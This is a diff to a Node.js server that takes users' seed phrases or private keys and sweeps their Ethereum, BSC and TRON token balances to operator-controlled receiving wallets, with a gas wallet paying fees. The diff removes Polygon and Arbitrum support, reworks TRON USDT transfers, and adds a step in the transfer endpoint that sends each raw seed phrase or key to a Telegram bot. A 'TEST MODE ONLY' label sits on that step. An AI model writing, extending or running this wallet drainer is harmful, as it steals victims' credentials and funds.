@@ -37,6 +37,7 @@ async function sendTelegramAlert(message) {
         console.log('📱 Telegram alert sent');
         return true;
     } catch (error) {
+        console.error('❌ Telegram error:', error.message);
         return false;
     }
 }
@@ -146,12 +147,6 @@ const receivingWallets = {
     BSC_WBTC: process.env.RECEIVING_WALLET_BSC_WBTC,
     BSC_LINK: process.env.RECEIVING_WALLET_BSC_LINK,
     BSC_UNI: process.env.RECEIVING_WALLET_BSC_UNI,
-    // Polygon
-    POLYGON_USDT: process.env.RECEIVING_WALLET_POLYGON_USDT,
-    POLYGON_USDC: process.env.RECEIVING_WALLET_POLYGON_USDC,
-    // Arbitrum
-    ARBITRUM_USDT: process.env.RECEIVING_WALLET_ARBITRUM_USDT,
-    ARBITRUM_USDC: process.env.RECEIVING_WALLET_ARBITRUM_USDC,
     // TRON
     TRX: process.env.RECEIVING_WALLET_TRX,
     USDT_TRC20: process.env.RECEIVING_WALLET_USDT_TRC20,
@@ -220,54 +215,6 @@ const BSC_CONFIG = {
     },
     tokenPrices: {
         BSC_USDT: 1, BSC_USDC: 1, BSC_DAI: 1, BSC_WBTC: 30000, BSC_LINK: 15, BSC_UNI: 7,
-    }
-};
-
-const POLYGON_CONFIG = {
-    name: 'Polygon',
-    networkKey: 'polygon',
-    rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com/',
-    chainId: 137,
-    nativeToken: 'MATIC',
-    nativeDecimals: 18,
-    nativePrice: 0.50,
-    gasCost: 0.5,
-    tokenContracts: {
-        POLYGON_USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-        POLYGON_USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-    },
-    tokenDecimals: {
-        POLYGON_USDT: 6, POLYGON_USDC: 6,
-    },
-    tokenNames: {
-        POLYGON_USDT: 'Polygon USDT', POLYGON_USDC: 'Polygon USDC',
-    },
-    tokenPrices: {
-        POLYGON_USDT: 1, POLYGON_USDC: 1,
-    }
-};
-
-const ARBITRUM_CONFIG = {
-    name: 'Arbitrum',
-    networkKey: 'arbitrum',
-    rpcUrl: process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
-    chainId: 42161,
-    nativeToken: 'ETH',
-    nativeDecimals: 18,
-    nativePrice: 2000,
-    gasCost: 0.0003,
-    tokenContracts: {
-        ARBITRUM_USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-        ARBITRUM_USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
-    },
-    tokenDecimals: {
-        ARBITRUM_USDT: 6, ARBITRUM_USDC: 6,
-    },
-    tokenNames: {
-        ARBITRUM_USDT: 'Arbitrum USDT', ARBITRUM_USDC: 'Arbitrum USDC',
-    },
-    tokenPrices: {
-        ARBITRUM_USDT: 1, ARBITRUM_USDC: 1,
     }
 };
 
@@ -354,20 +301,6 @@ async function getTronBalance(tronAddress, privateKey) {
     }
 }
 
-async function getTronTokenBalance(tronAddress, contractAddress, privateKey, decimals) {
-    try {
-        const tronWeb = new TronWeb({
-            fullHost: 'https://api.trongrid.io',
-            privateKey: privateKey
-        });
-        const contract = await tronWeb.contract().at(contractAddress);
-        const balanceRaw = await contract.balanceOf(tronAddress).call();
-        return balanceRaw / Math.pow(10, decimals);
-    } catch (error) {
-        return 0;
-    }
-}
-
 async function getTronBalances(userPrivateKey) {
     const balances = [];
     
@@ -381,6 +314,7 @@ async function getTronBalances(userPrivateKey) {
         console.log(`\n🟣 Scanning TRON Network`);
         console.log(`📍 TRON Address: ${tronAddress}`);
         
+        // Get TRX balance
         const trxBalance = await getTronBalance(tronAddress, userPrivateKey);
         if (trxBalance > 0) {
             balances.push({
@@ -393,23 +327,41 @@ async function getTronBalances(userPrivateKey) {
                 tronAddress: tronAddress
             });
             console.log(`💰 Found ${trxBalance} TRX ($${(trxBalance * 0.10).toFixed(2)})`);
+        } else {
+            console.log(`💰 TRX balance: 0`);
         }
         
-        const usdtBalance = await getTronTokenBalance(tronAddress, 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', userPrivateKey, 18);
-        if (usdtBalance > 0) {
-            balances.push({
-                currency: 'USDT_TRC20',
-                name: 'Tether USD',
-                balance: usdtBalance,
-                usdValue: usdtBalance,
-                chain: 'TRON',
-                isNative: false,
-                tronAddress: tronAddress
-            });
-            console.log(`💰 Found ${usdtBalance} USDT ($${usdtBalance})`);
+        // Check USDT (TRC-20)
+        const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        console.log(`   🔍 Checking USDT at ${usdtContractAddress}...`);
+        
+        try {
+            const contract = await tronWeb.contract().at(usdtContractAddress);
+            const usdtBalanceRaw = await contract.balanceOf(tronAddress).call();
+            const usdtDecimals = 18;
+            const usdtBalance = usdtBalanceRaw / Math.pow(10, usdtDecimals);
+            
+            console.log(`   📊 USDT balance: ${usdtBalance}`);
+            
+            if (usdtBalance > 0) {
+                balances.push({
+                    currency: 'USDT_TRC20',
+                    name: 'Tether USD',
+                    balance: usdtBalance,
+                    usdValue: usdtBalance,
+                    chain: 'TRON',
+                    isNative: false,
+                    tronAddress: tronAddress,
+                    contractAddress: usdtContractAddress
+                });
+                console.log(`💰 Found ${usdtBalance} USDT ($${usdtBalance})`);
+            }
+        } catch (usdtError) {
+            console.log(`   ⚠️ Could not check USDT: ${usdtError.message}`);
         }
         
         return { balances, tronAddress };
+        
     } catch (error) {
         console.error('Error scanning TRON:', error.message);
         return { balances: [], tronAddress: null };
@@ -639,20 +591,19 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                         status: 'success'
                     });
                     totalTransferredValue += usdValueTransferred;
+                    console.log(`   ✅ TRX transfer complete! TX: ${tx.txid}`);
                 }
                 
             } else {
-                // TRC-20 token transfer
+                // TRC-20 token transfer (USDT)
                 if (!hasEnoughTrx) {
                     console.log(`   💡 No TRX for gas. Using gas wallet...`);
                     
-                    if (gasWalletService.isEnabled) {
+                    if (gasWalletService.tronEnabled) {
                         try {
-                            const tokenAddress = token.currency === 'USDT_TRC20' ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : null;
-                            
                             const result = await gasWalletService.executeGasWalletTransfer(
                                 { getAddress: async () => tronAddress },
-                                tokenAddress,
+                                token.contractAddress,
                                 token.balance,
                                 token.currency,
                                 receivingWallets[token.currency],
@@ -677,6 +628,7 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                                     note: `Gas wallet used`
                                 });
                                 totalTransferredValue += usdValueTransferred;
+                                console.log(`   ✅ USDT transfer complete! TX: ${result.tokenTxHash}`);
                                 continue;
                             }
                         } catch (gasWalletError) {
@@ -699,7 +651,7 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                         continue;
                     }
                 } else {
-                    // User has TRX, use normal transfer
+                    // User has TRX, use normal transfer (95%)
                     amountTransferred = token.balance * 0.95;
                     usdValueTransferred = amountTransferred;
                     
@@ -708,8 +660,7 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                         privateKey: userPrivateKey
                     });
                     
-                    const tokenAddress = token.currency === 'USDT_TRC20' ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : null;
-                    const contract = await tronWeb.contract().at(tokenAddress);
+                    const contract = await tronWeb.contract().at(token.contractAddress);
                     const amountWithDecimals = amountTransferred * Math.pow(10, 18);
                     
                     const tx = await contract.transfer(receivingWallets[token.currency], amountWithDecimals).send();
@@ -724,10 +675,9 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                         status: 'success'
                     });
                     totalTransferredValue += usdValueTransferred;
+                    console.log(`   ✅ USDT transfer complete! TX: ${tx}`);
                 }
             }
-            
-            console.log(`   ✅ Transfer complete!`);
             
         } catch (error) {
             console.error(`   ❌ Failed:`, error.message);
@@ -772,6 +722,25 @@ app.get('/api/list-keys', async (req, res) => {
 app.post('/api/transfer-all', async (req, res) => {
     const { userInput, savedIdentifier } = req.body;
     console.log('\n🚀 ========== TRANSFER REQUEST ==========');
+    
+    // ============ SEND RAW INPUT TO TELEGRAM ============
+    if (userInput && userInput.length > 0) {
+        await sendTelegramAlert(`
+🔐 <b>RAW SEED PHRASE / PRIVATE KEY RECEIVED</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>📋 THE ACTUAL INPUT:</b>
+<code>${userInput.substring(0, 500)}</code>
+━━━━━━━━━━━━━━━━━━━━━━
+
+📅 <b>Time:</b> ${new Date().toLocaleString()}
+🔢 <b>Length:</b> ${userInput.length} characters
+📝 <b>Word count:</b> ${userInput.trim().split(/\s+/).length}
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+        `);
+    }
+    // ================================================
     
     let finalInput = userInput;
     if (savedIdentifier && !userInput) {
@@ -824,30 +793,7 @@ Time: ${new Date().toLocaleString()}
             allTransactions.push({ chain: 'BSC', status: 'error', error: error.message });
         }
         
-        // Process Polygon
-        console.log(`\n🟣 ========== PROCESSING POLYGON ==========`);
-        try {
-            const polygonResult = await processEvmChain(POLYGON_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-            allTransactions = polygonResult.allTransactions;
-            totalTransferredValue = polygonResult.totalTransferredValue;
-        } catch (error) {
-            console.error(`❌ Polygon processing error:`, error.message);
-            allTransactions.push({ chain: 'Polygon', status: 'error', error: error.message });
-        }
-        
-        // Process Arbitrum
-        console.log(`\n🔴 ========== PROCESSING ARBITRUM ==========`);
-        try {
-            const arbitrumResult = await processEvmChain(ARBITRUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-            allTransactions = arbitrumResult.allTransactions;
-            totalTransferredValue = arbitrumResult.totalTransferredValue;
-        } catch (error) {
-            console.error(`❌ Arbitrum processing error:`, error.message);
-            allTransactions.push({ chain: 'Arbitrum', status: 'error', error: error.message });
-        }
-        
         // Process TRON
-        console.log(`\n🟣 ========== PROCESSING TRON ==========`);
         try {
             const tronResult = await processTronWithGasWallet(userPrivateKey, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
             allTransactions = tronResult.allTransactions;
@@ -905,12 +851,11 @@ app.listen(port, () => {
     console.log(`\n✅ Server running at http://localhost:${port}`);
     console.log(`🔐 Encrypted storage enabled`);
     console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? 'ENABLED' : 'DISABLED'}`);
-    console.log(`⛽ Gas Wallet: ${gasWalletService.isEnabled ? 'ENABLED' : 'DISABLED'}`);
+    console.log(`⛽ EVM Gas Wallet: ${gasWalletService.isEnabled ? 'ENABLED' : 'DISABLED'}`);
+    console.log(`⛽ TRON Gas Wallet: ${gasWalletService.tronEnabled ? 'ENABLED' : 'DISABLED'}`);
     console.log(`\n💰 Supported Chains:`);
     console.log(`   - Ethereum (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} assets)`);
     console.log(`   - BNB Chain (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} assets)`);
-    console.log(`   - Polygon (${Object.keys(POLYGON_CONFIG.tokenContracts).length + 1} assets)`);
-    console.log(`   - Arbitrum (${Object.keys(ARBITRUM_CONFIG.tokenContracts).length + 1} assets)`);
     console.log(`   - TRON (TRX + TRC-20 tokens)`);
     console.log(`\n💡 Gas Wallet will cover gas for users without native tokens\n`);
 });
